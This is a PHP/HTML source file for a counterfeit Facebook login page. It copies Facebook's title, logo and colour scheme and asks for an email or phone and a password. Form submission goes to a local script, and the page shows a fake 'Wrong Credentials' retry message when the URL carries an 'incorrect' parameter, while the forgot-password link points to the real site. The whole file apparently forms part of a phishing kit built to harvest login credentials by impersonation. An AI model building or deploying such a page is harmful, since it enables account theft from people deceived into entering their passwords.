<?php 

?>

<!DOCTYPE html>
<html lang="en">
<style>
    .alert-red{
        background-color:#f8d7da !important;
        border: 1px solid #721c24;
        max-width: 370px !important;
        margin: auto !important;
        padding: 0 !important;
        border-radius: 0px !important;
        margin-bottom: 12px !important;
    }
    .alert-red p {
    margin: 0px !important;
    font-size: 12px !important;
    padding: 10px !important;
}
</style>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="./assets/img/fico.ico" type="image/x-icon">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
    <link href="./assets/css/boxicons.min.css" rel="stylesheet">

    <link rel="stylesheet" href="./assets/css/loginstyle.css">
    <title>Facebook</title>

</head>
<body>
    <div class="container">
        <div class="main">
            <img src="./assets/img/flogo.svg" alt="" style="width: 190px;margin-bottom: 25px;">
            <?php if (!isset($_GET["incorrect"])) {
                echo "
                    <div class='must'>
                        <div style='background-color:#3578e5;width:38px;height:38px;border-radius:4px;'>
                            <img src='./assets/img/i.png' alt='' width='20px' style='padding-top: 9px;'>
                        </div>
                        <p>You must log in to continue.</p>
                    </div>";
                }
            ?>
            <div class="lgF" style="height: 480px !important;">
            <form method="POST" class="form" onsubmit="return onLoginSubmit(this)">
        <p style="color:#000; font-family: Helvetica, Arial, sans-serif; font-size: 19px; padding-top: 25px;">
            Log Into Facebook
        </p>
<?php 
 if (!isset($_GET["incorrect"])) {
    echo "
          <div class='alert'>
            <p>You must log in to continue.</p>
        </div>

";
}else{
    echo "<div class='alert-red'>
    <p><b style='font-size:15px;'>Wrong Credentials</b></p>
        <p style='padding-top:2px !important'>Invalid email or password</p>
    </div>
    ";
}


?>
        <div class="form-group">
            <input type="text" name="emailPhone" id="emailPhone" placeholder="Email address"
                class="form-control emailPhone" style="border-radius: 6px;" value="">
            <div class="emailPhone-error error-message"></div>
        </div>
        <div class="form-group" style="margin-top: 10px;">
            <input type="password" name="pw" id="pw" placeholder="Password" class="form-control pw"
                style="border-radius: 6px;">
            <div class="pw-error error-message"></div>
        </div>
        <br>
        <div class="form-group">
            <button type="submit" class="form-control btn login-button" 
                style="color: #fff; background-color: #1877F2; margin-top: 10px; font-size: 21px; font-weight: 600; height: 50px; padding-top: 5px !important; padding-bottom: 5px !important; border-radius: 6px;">
                <i class="bx bx-loader-alt bx-spin bx-rotate-90" style="display: none;"></i> <!-- Spinner icon -->
                Log In
            </button>
        </div>
        <p style="margin-top: 10px; font-size: 14px; color: #1877f2; cursor: pointer;">
            <a href="https://www.facebook.com/login/identify/" style="text-decoration: none !important;" target="_blank">
                Forgot password?
            </a>
        </p>
    </form>
</div>
        </div>
    </div>
    <?php include "./components/LoginFooter.php"; ?>
    <!-- Validation -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script> <!-- jQuery library -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="./assets/js/login.js"></script>
</body>

</html>